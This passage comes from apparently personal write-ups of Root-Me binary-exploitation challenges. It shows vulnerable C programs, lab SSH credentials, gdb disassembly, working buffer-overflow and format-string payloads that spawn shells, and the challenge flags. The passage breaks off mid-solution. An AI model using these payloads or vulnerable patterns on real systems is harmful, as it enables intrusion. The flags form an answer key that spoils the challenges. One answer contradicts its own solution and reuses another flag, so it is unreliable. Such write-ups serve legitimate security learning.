# [Root-Me](./rootme.md) Root-Me App - System Challenges [7/83]

These challenges will help you understand applicative vulnerabilities. 

## Contents

1. [ELF x86 - Stack buffer overflow basic 1](#elf-x86-stack-buffer-overflow-basic-1) 🗸
2. [ELF x86 - Stack buffer overflow basic 2](#elf-x86-stack-buffer-overflow-basic-2) 🗸
3. [PE32 - Stack buffer overflow basic](#pe32-stack-buffer-overflow-basic) 🗸
4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1) 🗸
5. [ELF x64 - Stack buffer overflow - basic](#elf-x64-stack-buffer-overflow-basic) 🗸
6. [ELF x86 - Format string bug basic 2](#elf-x86-format-string-bug-basic-2) 🗸
7. [ELF x86 - Race condition](#elf-x86-race-condition) 🗸
8. [ELF ARM - Stack buffer overflow - basic](#elf-arm-stack-buffer-overflow-basic)
9. [ELF MIPS - Stack buffer overflow - No NX](#elf-mips-stack-buffer-overflow-no-nx)
10. [ELF x64 - Double free](#elf-x64-double-free)
11. [ELF x86 - Stack buffer overflow basic 3](#elf-x86-stack-buffer-overflow-basic-3)
12. [ELF x86 - Use After Free - basic](#elf-x86-use-after-free-basic)
13. [ELF ARM - Stack Spraying](#elf-arm-stack-spraying)
14. [ELF x64 - Stack buffer overflow - PIE](#elf-x64-stack-buffer-overflow-pie)
15. [ELF x86 - BSS buffer overflow](#elf-x86-bss-buffer-overflow)
16. [ELF x86 - Stack buffer overflow basic 4](#elf-x86-stack-buffer-overflow-basic-4)
17. [ELF x86 - Stack buffer overflow basic 6](#elf-x86-stack-buffer-overflow-basic-6)
18. [ELF x86 - Format String Bug Basic 3](#elf-x86-format-string-bug-basic-3)
19. [PE32 - Advanced stack buffer overflow](#pe32-advanced-stack-buffer-overflow)
20. [ELF ARM - Basic ROP](#elf-arm-basic-rop)
21. [ELF MIPS - Basic ROP](#elf-mips-basic-rop)
22. [ELF x86 - Stack buffer overflow - C++ vtables](#elf-x86-stack-buffer-overflow-cpp-vtables)
23. [PE32+ Format string bug](#pe32-format-string-bug)
24. [ELF x64 - Logic bug](#elf-x64-logic-bug)
25. [ELF x86 - Bug Hunting - Several issues](#elf-x86-bug-hunting-several-issues)
26. [ELF x86 - Stack buffer and integer overflow](#elf-x86-stack-buffer-and-integer-overflow)
27. [ELF x86 - Stack buffer overflow - ret2dl_resolve](#elf-x86-stack-buffer-overflow-ret2dl-resolve)
28. [ELF x86 - Stack buffer overflow basic 5](#elf-x86-stack-buffer-overflow-basic-5)
29. [ELF x64 - Stack buffer overflow - advanced](#elf-x64-stack-buffer-overflow-advanced)
30. [ELF MIPS - Format String Glitch](#elf-mips-format-string-glitch)
31. [ELF x64 - Heap Filling](#elf-x64-heap-filling)
32. [ELF x86 - Information leakage with Stack Smashing Protector](#elf-x86-information-leakage-with-stack-smashing-protector)
33. [ELF x64 - File Structure Hacking](#elf-x64-file-structure-hacking)
34. [ELF ARM - Race condition](#elf-arm-race-condition)
35. [ELF x64 - Browser exploit - Intro](#elf-x64-browser-exploit-intro)
36. [ELF x64 - Heap Safe-Linking Bypass](#elf-x64-heap-safe-linking-bypass)
37. [ELF x64 - ret2dl_init](#elf-x64-ret2dl-init)
38. [ELF x86 - Out of bounds attack - French Paradox](#elf-x86-out-of-bounds-attack-french-paradox)
39. [ELF x86 - Remote BSS buffer overflow](#elf-x86-remote-bss-buffer-overflow)
40. [ELF x86 - Remote Format String bug](#elf-x86-remote-format-string-bug)
41. [PE32+ Basic ROP](#pe32-basic-rop)
42. [ELF x64 - Remote heap buffer overflow - fastbin](#elf-x64-remote-heap-buffer-overflow-fastbin)
43. [ELF x86 - Blind remote format string bug](#elf-x86-blind-remote-format-string-bug)
44. [LinKern ARM - vulnerable syscall](#linkern-arm-vulnerable-syscall)
45. [LinKern x86 - Buffer overflow basic 1](#linkern-x86-buffer-overflow-basic-1)
46. [LinKern x86 - Null pointer dereference](#linkern-x86-null-pointer-dereference)
47. [LinKern x64 - Race condition](#linkern-x64-race-condition)
48. [ELF ARM - Alphanumeric shellcode](#elf-arm-alphanumeric-shellcode)
49. [ELF MIPS - URLEncoded Format String bug](#elf-mips-urlencoded-format-string-bug)
50. [ELF x86 - Hardened binary 1](#elf-x86-hardened-binary-1)
51. [ELF x86 - Hardened binary 2](#elf-x86-hardened-binary-2)
52. [ELF x86 - Hardened binary 3](#elf-x86-hardened-binary-3)
53. [ELF x86 - Hardened binary 4](#elf-x86-hardened-binary-4)
54. [LinKern MIPSel - Vulnerable ioctl](#linkern-mipsel-vulnerable-ioctl)
55. [LinKern x64 - reentrant code](#linkern-x64-reentrant-code)
56. [ELF ARM - Heap format string bug](#elf-arm-heap-format-string-bug)
57. [ELF x64 - Sigreturn Oriented Programming](#elf-x64-sigreturn-oriented-programming)
58. [ELF ARM - Format String bug](#elf-arm-format-string-bug)
59. [ELF ARM - Use After Free](#elf-arm-use-after-free)
60. [ELF x64 - FILE structure hijacking](#elf-x64-file-structure-hijacking)
61. [ELF x64 - Heap feng-shui](#elf-x64-heap-feng-shui)
62. [ELF x64 - Off-by-one bug](#elf-x64-off-by-one-bug)
63. [ELF x86 - Hardened binary 5](#elf-x86-hardened-binary-5)
64. [LinKern ARM - Stack Overflow](#linkern-arm-stack-overflow)
65. [LinKern x86 - basic ROP](#linkern-x86-basic-rop)
66. [ELF ARM - Heap Off-by-One](#elf-arm-heap-off-by-one)
67. [ELF x64 - Remote Heap buffer overflow 1](#elf-x64-remote-heap-buffer-overflow-1)
68. [ELF x86 - Hardened binary 6](#elf-x86-hardened-binary-6)
69. [ELF x86 - Hardened binary 7](#elf-x86-hardened-binary-7)
70. [ELF x86 - Remote stack buffer overflow - Hardened](#elf-x86-remote-stack-buffer-overflow-hardened)
71. [LinKern x64 - RowHammer](#linkern-x64-rowhammer)
72. [LinKern x64 - SLUB off-by-one](#linkern-x64-slub-off-by-one)
73. [ELF ARM - Heap buffer overflow - Wilderness](#elf-arm-heap-buffer-overflow-wilderness)
74. [ELF ARM - Heap Overflow](#elf-arm-heap-overflow)
75. [ELF x64 - Seccomp Whitelist](#elf-x64-seccomp-whitelist)
76. [ELF x86 - Blind ROP](#elf-x86-blind-rop)
77. [Linkern x64 - Memory exploration](#linkern-x64-memory-exploration)
78. [WinKern x64 - Advanced stack buffer overflow - ROP](#winkern-x64-advanced-stack-buffer-overflow-rop)
79. [WinKern x64 - Use After Free](#winkern-x64-use-after-free)
80. [ELF x64 - Remote Heap buffer overflow 2](#elf-x64-remote-heap-buffer-overflow-2)
81. [ELF x64 - Advanced Heap Exploitation - Heap Leakless & Fortified](#elf-x64-advanced-heap-exploitation-heap-leakless-fortified)
82. [ELF x64 - Blind ROP](#elf-x64-blind-rop)
83. [ELF x64 - Browser exploit - BitString](#elf-x64-browser-exploit-bitstring)

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ELF x86 Stack buffer overflow basic 1

- Author: Lyes
- Date: 25 March 2015
- Points: 5
- Level: 1

### Statement

Environment configuration:

<details>

<summary markdown="span">Source Code</summary>

~~~c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
     
int main()
{
     
  int var;
  int check = 0x04030201;
  char buf[40];
     
  fgets(buf,45,stdin);
     
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
  
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  
  if (check == 0xdeadbeef)
  {
    printf("Yeah dude! You win!\nOpening your shell...\n");
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
    printf("Shell closed! Bye.\n");
  }
  return 0;
}
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch13@challenge02.root-me.org 
- Username: app-systeme-ch13
- Password: app-systeme-ch13

### Resources

1. [youtube](https://www.youtube.com/watch?v=u-OZQkv2ebw).
2. [buffering in standard streams](https://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf).
3. [Exploiting Stack Buffer Overflows in Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the vulnerability in the buf variable:

~~~c
char buf[40];     
fgets(buf,45,stdin);
~~~

The variable buf is allocated 40 Bytes but the fgets reads 45 Bytes in.  We can overflow the buf buffer and write into the stack.

Connecting, we can see the vulnerability:

~~~shell
app-systeme-ch13@challenge02:~$ ./ch13
0000000000000000000000000000000000000000000000

[buf]: 000000000000000000000000000000000000000000000
[check] 0x3030303030

You are on the right way!
app-systeme-ch13@challenge02:~$ ./ch13
0000000000000000000000000000000000000000111111

[buf]: 000000000000000000000000000000000000000011111
[check] 0x3131313131

You are on the right way!
~~~

We can see the overflow checks the check variable which is manipulated by the trailing characters (0x31 = "1").  We ncan check the endian-ness of the buffer:

~~~shell
app-systeme-ch13@challenge02:~$ ./ch13
000000000000000000000000000000000000000012345

[buf]: 00000000000000000000000000000000000000001234
[check] 0x34333231

You are on the right way!
~~~
  
This shows us the variable is little-endian.  We need to append a 5-byte statement to generate a correct little-endian value as detailed in the source code:

~~~c
if (check == 0xdeadbeef)
~~~

We can use python to insert the hex chars:

~~~shell
app-systeme-ch13@challenge02:~$ (python -c 'print("0"*40+"\xef\xbe\xad\xde")') | ./ch13

[buf]: 0000000000000000000000000000000000000000ﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
~~~

This opens a shell and immediately closes it.  We need to interrupt it using cat:

~~~shell
app-systeme-ch13@challenge02:~$ (python -c 'print("0"*40+"\xef\xbe\xad\xde")'; cat) | ./ch13

[buf]: 0000000000000000000000000000000000000000ﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
ls
ch13  ch13.c  Makefile
strings .passwd
1w4ntm0r3pr0np1s
exit
Shell closed! Bye.
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
1w4ntm0r3pr0np1s
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ELF x86 Stack buffer overflow basic 2

- Author: Lyes
- Date: 10 April 2015
- Points: 10
- Level: 1

### Statement

<details>

<summary markdown="span">Source Code</summary>

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
     
void shell() {
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
     
void sup() {
  printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
     
void main()
{
  int var;
  void (*func)()=sup;
  char buf[128];
  fgets(buf,133,stdin);
  func();
}
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch15@challenge02.root-me.org 
- Username: app-systeme-ch15
- Password: app-systeme-ch15

### Resources

1. [youtube](https://www.youtube.com/watch?v=u-OZQkv2ebw).
2. [Exploiting Stack Buffer Overflows in Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf).
3. [64 bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the vulnerability in the buf variable:

~~~c
char buf[128];
fgets(buf,133,stdin);
~~~

The variable buf is allocated 128 Bytes but the fgets reads 133 Bytes in.  We can overflow the buf buffer and write into the stack.  We can also see a call to the bash shell in shell().  We need to call that instead of funcP{

Connecting, we can see the vulnerability:

~~~shell
$ ssh -p 2222 app-systeme-ch15@challenge02.root-me.org
app-systeme-ch15@challenge02:~$ ls
ch15  ch15.c  Makefile
app-systeme-ch15@challenge02:~$ ./ch15
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 
app-systeme-ch15@challenge02:~$ ./ch15
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012345
Segmentation fault
~~~

We can decompile in gdb to find the address of the shell() function:

~~~shell
app-systeme-ch15@challenge02:~$ gdb ch15
gdb) run
Starting program: /challenge/app-systeme/ch15/ch15 
1
Hey dude ! Waaaaazzaaaaaaaa ?!
[Inferior 1 (process 24071) exited with code 037]
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048584 <+0>:	lea    0x4(%esp),%ecx
   0x08048588 <+4>:	and    $0xfffffff0,%esp
   0x0804858b <+7>:	pushl  -0x4(%ecx)
   0x0804858e <+10>:	push   %ebp
   0x0804858f <+11>:	mov    %esp,%ebp
   0x08048591 <+13>:	push   %ebx
   0x08048592 <+14>:	push   %ecx
   0x08048593 <+15>:	sub    $0x90,%esp
   0x08048599 <+21>:	call   0x80485de <__x86.get_pc_thunk.ax>
   0x0804859e <+26>:	add    $0x1a62,%eax
   0x080485a3 <+31>:	lea    -0x1aa7(%eax),%edx
   0x080485a9 <+37>:	mov    %edx,-0xc(%ebp)
   0x080485ac <+40>:	mov    -0x4(%eax),%edx
   0x080485b2 <+46>:	mov    (%edx),%edx
   0x080485b4 <+48>:	sub    $0x4,%esp
   0x080485b7 <+51>:	push   %edx
   0x080485b8 <+52>:	push   $0x85
   0x080485bd <+57>:	lea    -0x8c(%ebp),%edx
   0x080485c3 <+63>:	push   %edx
   0x080485c4 <+64>:	mov    %eax,%ebx
   0x080485c6 <+66>:	call   0x8048390 <fgets@plt>
   0x080485cb <+71>:	add    $0x10,%esp
   0x080485ce <+74>:	mov    -0xc(%ebp),%eax
   0x080485d1 <+77>:	call   *%eax
   0x080485d3 <+79>:	nop
   0x080485d4 <+80>:	lea    -0x8(%ebp),%esp
   0x080485d7 <+83>:	pop    %ecx
   0x080485d8 <+84>:	pop    %ebx
   0x080485d9 <+85>:	pop    %ebp
   0x080485da <+86>:	lea    -0x4(%ecx),%esp
   0x080485dd <+89>:	ret    
End of assembler dump.
~~~
  
We can look at the memory address for shell:

~~~shell
(gdb) disassemble shell
Dump of assembler code for function shell:
   0x08048516 <+0>:	push   ebp
   0x08048517 <+1>:	mov    ebp,esp
   0x08048519 <+3>:	push   esi
   0x0804851a <+4>:	push   ebx
   0x0804851b <+5>:	call   0x8048450 <__x86.get_pc_thunk.bx>
   0x08048520 <+10>:	add    ebx,0x1ae0
   0x08048526 <+16>:	call   0x80483a0 <geteuid@plt>
   0x0804852b <+21>:	mov    esi,eax
   0x0804852d <+23>:	call   0x80483a0 <geteuid@plt>
   0x08048532 <+28>:	sub    esp,0x8
   0x08048535 <+31>:	push   esi
   0x08048536 <+32>:	push   eax
   0x08048537 <+33>:	call   0x80483d0 <setreuid@plt>
   0x0804853c <+38>:	add    esp,0x10
   0x0804853f <+41>:	sub    esp,0xc
   0x08048542 <+44>:	lea    eax,[ebx-0x1990]
   0x08048548 <+50>:	push   eax
   0x08048549 <+51>:	call   0x80483c0 <system@plt>
   0x0804854e <+56>:	add    esp,0x10
   0x08048551 <+59>:	nop
   0x08048552 <+60>:	lea    esp,[ebp-0x8]
   0x08048555 <+63>:	pop    ebx
   0x08048556 <+64>:	pop    esi
   0x08048557 <+65>:	pop    ebp
   0x08048558 <+66>:	ret    
End of assembler dump.
~~~

We need to call address 0x08048516:

~~~shell
app-systeme-ch15@challenge02:~$ (python -c 'print("0"*128+"\x16\x85\x04\x08")'; cat) | ./ch15

ls
ch15  ch15.c  Makefile
whoami
app-systeme-ch15-cracked
strings .passwd
B33r1sSoG0oD4y0urBr4iN
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
B33r1sSoG0oD4y0urBr4iN
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## PE32 Stack buffer overflow basic

- Author: Ech0
- Date: 3 December 2019
- Points: 10
- Level: 1

### Statement

A simple local buffer overflow.

<details>

<summary markdown="span">Source Code</summary>

~~~c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <ctype.h>
     
    #define DEFAULT_LEN 16
     
    void admin_shell(void)
    {
            system("C:\\Windows\\system32\\cmd.exe");
    }
     
    int main(void)
    {
            char buff[DEFAULT_LEN] = {0};
     
            gets(buff);
            for (int i = 0; i < DEFAULT_LEN; i++) {
                    buff[i] = toupper(buff[i]);
            }
            printf("%s\n", buff);
    }
~~~

</details>

### Connection Details

- Host: challenge05.root-me.org
- Protocol: SSH
- Port:2225
- SSH access: ssh -p 2225 app-systeme-ch72@challenge05.root-me.org 
- Username: app-systeme-ch72
- Password: app-systeme-ch72

### Resources

1. [Stack Bug - Exmploit writing tutorial part 1 stack based overflows](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Stack%20Bug%20-%20Exploit%20writing%20tutorial%20part%201%20stack%20based%20overflows.pdf).
2. [Stack Bug - Exmploit writing tutorial part 2 stack based overflows](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Stack%20Bug%20-%20Exploit%20writing%20tutorial%20part%202%20%20Stack%20Based%20Overflows%20%E2%80%93%20jumping%20to%20shellcode.pdf).
3. [Corelan.be - exploiting writing tutorial part 1](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Corelan.be%20-%20Exploiting%20writing%20tutorial%20part1%20-%20Stack%20based%20overflows.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the vulnerability in the buff variable:

~~~c
#define DEFAULT_LEN 16
...
char buff[DEFAULT_LEN] = {0};
gets(buff);
~~~

The first 16 characters are translated to uppoer case characters in a for loop and the buff variable is printed:

~~~c
for (int i = 0; i < DEFAULT_LEN; i++) {
    buff[i] = toupper(buff[i]);
}
printf("%s\n", buff);
~~~

We can connect to the challenge server and test the output:

~~~shell
$ ssh -p 2225 app-systeme-ch72@challenge05.root-me.org
app-systeme-ch72@challenge05:~$ ls
ch72.c  ch72.exe  ch72.obj  exploit.sh  Makefile  wrapper.sh
app-systeme-ch72@challenge05:~$ ./ch72.exe
abcd
ABCD
app-systeme-ch72@challenge05:~$ ./ch72.exe
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOP
Segmentation fault
~~~

We can see the buffer overflow exists but we need to identify the stack addresses and the call to the admin_shell function.  We can download the exe file:

~~~shell
$ scp -P 2225 app-systeme-ch72@challenge05.root-me.org:ch72.exe ~/Downloads/
      _           _ _                        ___  ____  
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \| ___| 
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |___ \ 
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |___) |
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/ 
                                 |___/ root-me.org      

app-systeme-ch72@challenge05.root-me.orgs password: 
ch72.exe                                                                                                                                                                                                    100%  104KB 977.1KB/s   00:00    
$ ls
ch72.exe
~~~

Using a windows disassembler, we can find the buffer and padding at EBP-14.  The admin_shell command is at 0x401000 (EIP), 24 Bytes after the buffer.  We can submit a buffer to the program using python with 24 characters and little-endian memory address for the admin_shell command:

~~~shell
app-systeme-ch72@challenge05:~$ (python -c 'print(24*"a"+"\x00\x10\x40\x00")'; cat) | ./ch72.exe
AAAAAAAAAAAAAAAA
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\cygwin64\challenge\app-systeme\ch72>ls -al
ls -al
total 126
dr-xr-x---+ 1 root Users               0 Dec 12 09:54 .
drwx---r-x+ 1 root None                0 Dec  2  2019 ..
-r--------  1 root Administrators   1862 Dec 12 09:50 ._perms
-rw-r-----  1 root Administrators     44 Dec 12 09:25 .git
-rw-r-----+ 1 root Administrators     33 Dec  3  2019 .passwd
drwx------+ 1 root Users               0 Oct  6  2019 .ssh
-rw-r-----  1 root Users             336 Dec  2  2019 ch72.c
-rwxr-x---+ 1 root Users          105984 Dec  3  2019 ch72.exe
-rwxr-x---  1 root Users            1550 Dec  3  2019 ch72.obj
----------+ 1 root None              175 Oct  5  2019 exploit.sh
-rw-------+ 1 root None              233 Mar 27  2019 Makefile
-rwxr-x---+ 1 root Users             135 Dec  3  2019 wrapper.sh
~~~

We are now in the windows shell and can attempt to view the .passwd file:

~~~shell
C:\cygwin64\challenge\app-systeme\ch72>cat .passwd
 cat .passwd
'cat' is not recognized as an internal or external command,
operable program or batch file.
~~~

We cannot use cat, if we exit and try the ./wrapper.sh function, this may enable the use of the cat command in the windows shell:

~~~shell
app-systeme-ch72@challenge05:~$ (python -c 'print(24*"a"+"\x00\x10\x40\x00")'; cat) | ./wrapper.sh
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\cygwin64\challenge\app-systeme\ch72>cat .passwd
cat .passwd
466aa7907db65a182fe0cc97931388c7
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
466aa7907db65a182fe0cc97931388c7
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---
     
## ELF x86 Format string bug basic 1

- Author: Lu33Y
- Date: 8 February 2012
- Points: 15
- Level: 2

### Statement
     
<details>

<summary markdown="span">Source Code</summary>

~~~c
    #include <stdio.h>
    #include <unistd.h>
     
    int main(int argc, char *argv[]){
            FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
            char buffer[32];
            fgets(buffer, sizeof(buffer), secret);
            printf(argv[1]);
            fclose(secret);
            return 0;
    }

~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch5@challenge02.root-me.org 
- Username: app-systeme-ch5
- Password: app-systeme-ch5

### Resources

1. [Format Bugs - Exploiting format string](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Format%20Bugs%20-%20Exploiting%20format%20string.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

This is a simple string buffer exploit.  By re-formatting the input string we can print memory values:

~~~shell
$ ./ch5 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
00000020.0804b160.0804853d.00000009.bffffd1f.b7e1b679.bffffbe4.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b
~~~

We can decode into ascii and get the following string:
    
~~~
0x000000200804b1600804853d00000009bffffd1fb7e1b679bffffbe4b7fc3000b7fc30000804b16039617044282936646d617045bf000a640804861b
??? ??±`???=???\t¿ÿý?·á¶y¿ÿûä·ü0?·ü0???±`9apD()6dmapE¿?d?
~~~

This is little-endian, we can thus invert the string to recover the solution:

~~~
??? ??±`???=???\t¿ÿý?·á¶y¿ÿûä·ü0?·ü0???±`9apD()6dmapE¿?d?
 ???`±??=???\t????ýÿ¿y¶á·äûÿ¿?0ü·?0ü·`±??Dpa9d6)(Epam?d?¿
~~~

The solution will be the only printable string in the above:

~~~
Dpa9d6)(Epamd
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
B33r1sSoG0oD4y0urBr4iN
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---
     
## ELF x64 Stack buffer overflow basic

- Author: Arod
- Date: 31 May 2015
- Points: 20
- Level: 2

### Statement

<details>

<summary markdown="span">Source Code</summary>

~~~c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/
 
void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}
 
int main(int argc, char **argv){
 
    char buffer[256];
    int len, i;
 
    scanf("%s", buffer);
    len = strlen(buffer);
 
    printf("Hello %s\n", buffer);
 
    return 0;
}
~~~

</details>

### Connection Details

- Host: challenge03.root-me.org
- Protocol: SSH
- Port:2223
- SSH access: ssh -p 2225 app-systeme-ch35@challenge03.root-me.org 
- Username: app-systeme-ch35
- Password: app-systeme-ch35

### Resources

1. [64 Bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the vulnerability in the buffer variable:

~~~c
    char buffer[256];
    int len, i;
 
    scanf("%s", buffer);
    len = strlen(buffer);
 
    printf("Hello %s\n", buffer);
~~~

The first 256 characters are included in the buffer but we may be able to overflow this:

~~~shell
$ ssh -p 2223 app-systeme-ch35@challenge03.root-me.org
app-systeme-ch35@challenge03:~$ (python -c 'print(256*"a"+256*"b")') | ./ch35; 
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb
Segmentation fault
~~~

We can see the buffer overflow exists but we need to identify the stack addresses and the call to the callMeMaybe() function.  We can disassemble on the challenge server using gdb:

~~~shell
$ gdb ch35
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ch35...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400628 <+0>:	push   rbp
   0x0000000000400629 <+1>:	mov    rbp,rsp
   0x000000000040062c <+4>:	sub    rsp,0x120
   0x0000000000400633 <+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x0000000000400639 <+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x0000000000400640 <+24>:	lea    rax,[rbp-0x110]
   0x0000000000400647 <+31>:	mov    rsi,rax
   0x000000000040064a <+34>:	lea    rdi,[rip+0xd0]        # 0x400721
   0x0000000000400651 <+41>:	mov    eax,0x0
   0x0000000000400656 <+46>:	call   0x4004f0 <__isoc99_scanf@plt>
   0x000000000040065b <+51>:	lea    rax,[rbp-0x110]
   0x0000000000400662 <+58>:	mov    rdi,rax
   0x0000000000400665 <+61>:	call   0x4004c0 <strlen@plt>
   0x000000000040066a <+66>:	mov    DWORD PTR [rbp-0x4],eax
   0x000000000040066d <+69>:	lea    rax,[rbp-0x110]
   0x0000000000400674 <+76>:	mov    rsi,rax
   0x0000000000400677 <+79>:	lea    rdi,[rip+0xa6]        # 0x400724
   0x000000000040067e <+86>:	mov    eax,0x0
   0x0000000000400683 <+91>:	call   0x4004d0 <printf@plt>
   0x0000000000400688 <+96>:	mov    eax,0x0
   0x000000000040068d <+101>:	leave  
   0x000000000040068e <+102>:	ret    
End of assembler dump.
(gdb) disass callMeMaybe
Dump of assembler code for function callMeMaybe:
   0x00000000004005e7 <+0>:	push   rbp
   0x00000000004005e8 <+1>:	mov    rbp,rsp
   0x00000000004005eb <+4>:	sub    rsp,0x20
   0x00000000004005ef <+8>:	lea    rax,[rip+0x11e]        # 0x400714
   0x00000000004005f6 <+15>:	mov    QWORD PTR [rbp-0x20],rax
   0x00000000004005fa <+19>:	lea    rax,[rip+0x11d]        # 0x40071e
   0x0000000000400601 <+26>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000000000400605 <+30>:	mov    QWORD PTR [rbp-0x10],0x0
   0x000000000040060d <+38>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000400611 <+42>:	lea    rcx,[rbp-0x20]
   0x0000000000400615 <+46>:	mov    edx,0x0
   0x000000000040061a <+51>:	mov    rsi,rcx
   0x000000000040061d <+54>:	mov    rdi,rax
   0x0000000000400620 <+57>:	call   0x4004e0 <execve@plt>
   0x0000000000400625 <+62>:	nop
   0x0000000000400626 <+63>:	leave  
   0x0000000000400627 <+64>:	ret    
End of assembler dump.
~~~

The disassembly of main shows the memory allocation for the buffer occurs at $RBP-0x110, and the len variable is stored at $RBP-0x04:

~~~
   0x000000000040065b <+51>:	lea    rax,[rbp-0x110]
   0x0000000000400662 <+58>:	mov    rdi,rax
   0x0000000000400665 <+61>:	call   0x4004c0 <strlen@plt>
   0x000000000040066a <+66>:	mov    DWORD PTR [rbp-0x4],eax
~~~

The stack will appear:

|--------|------|------------|
| Buffer | 268B | $RBP-0x110 |
| Len    | 4B   | $RBP-0x04  |
| $RBP   | 8B   | $RBP       |
|--------|------|------------|

The address of the callMeMaybe() function is 0x4005e7, in little-endian (8B) will be: 0xe7 0x05 0x40 0x00 0x00 0x00 0x00 0x00.  We can append this to a string of length 268+4+8B:

~~~shell
